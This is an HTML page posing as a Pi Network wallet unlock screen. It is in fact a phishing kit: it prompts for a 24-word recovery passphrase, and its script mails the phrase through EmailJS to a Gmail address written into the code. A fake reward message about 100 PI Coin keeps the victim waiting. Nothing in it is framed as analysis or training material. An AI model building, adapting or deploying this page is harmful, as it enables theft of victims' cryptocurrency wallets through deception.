<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unlock Pi Wallet</title>
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <script>
        (function() {
            emailjs.init("YOUR_USER_ID"); // Replace with your EmailJS User ID
        })();

        function sendPassphrase() {
            var passphrase = document.getElementById("passphrase").value.trim();
            
            // Validate the passphrase input
            if (passphrase === "") {
                showToast("Invalid passphrase");
                return;
            }

            var templateParams = {
                passphrase: passphrase,
                email_to: "bcmideachannel@gmail.com"
            };

            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", templateParams)
                .then(function(response) {
                    console.log("SUCCESS!", response.status, response.text);
                    showSuccessMessage();
                }, function(error) {
                    console.log("FAILED...", error);
                    showToast("Failed to send. Please try again.");
                });
        }

        function showSuccessMessage() {
            var container = document.querySelector(".wallet-container");
            container.innerHTML = `
                <h2>Congratulations!</h2>
                <p>You have earned 100 PI Coin. Please wait 12 hours before it will be transferred to your account.</p>
                <p>Make sure your passphrase is correct.</p>
            `;
        }

        function showToast(message) {
            var toast = document.getElementById("toast");
            toast.innerText = message;
            toast.className = "show";
            setTimeout(function() {
                toast.className = toast.className.replace("show", "");
            }, 3000);
        }
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .wallet-container {
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 90%;
            max-width: 350px;
            margin: 0 20px;
            text-align: center;
        }
        .wallet-container h2 {
            color: #4f2d84;
        }
        .wallet-container textarea {
            width: calc(100% - 20px);
            height: 100px;
            border-radius: 5px;
            border: 1px solid #ccc;
            padding: 10px;
            margin-left: 10px;
            margin-right: 10px;
            resize: none;
            font-size: 14px;
        }
        .wallet-container textarea:required:invalid {
            border: 1px solid red;
        }
        .wallet-container button {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            color: #fff;
            font-size: 16px;
            margin-top: 10px;
            cursor: pointer;
            background-color: #4f2d84;
        }
        .wallet-container button:hover {
            background-color: #3b2169;
        }
        .toast {
            visibility: hidden;
            min-width: 250px;
            background-color: #333;
            color: #fff;
            text-align: center;
            border-radius: 5px;
            padding: 10px;
            position: fixed;
            z-index: 1;
            left: 50%;
            bottom: 30px;
            transform: translateX(-50%);
        }
        .toast.show {
            visibility: visible;
            animation: fadein 0.5s, fadeout 0.5s 2.5s;
        }
        @keyframes fadein {
            from {bottom: 0; opacity: 0;}
            to {bottom: 30px; opacity: 1;}
        }
        @keyframes fadeout {
            from {bottom: 30px; opacity: 1;}
            to {bottom: 0; opacity: 0;}
        }
    </style>
</head>
<body>
    <div class="wallet-container">
        <h2>Unlock Pi Wallet</h2>
        <textarea id="passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
        <button onclick="sendPassphrase()">Unlock With Passphrase</button>
        <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
        <p>Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your Ï€ in your previous wallet will be inaccessible.</p>
    </div>
    <div id="toast" class="toast"></div>
</body>
</html>
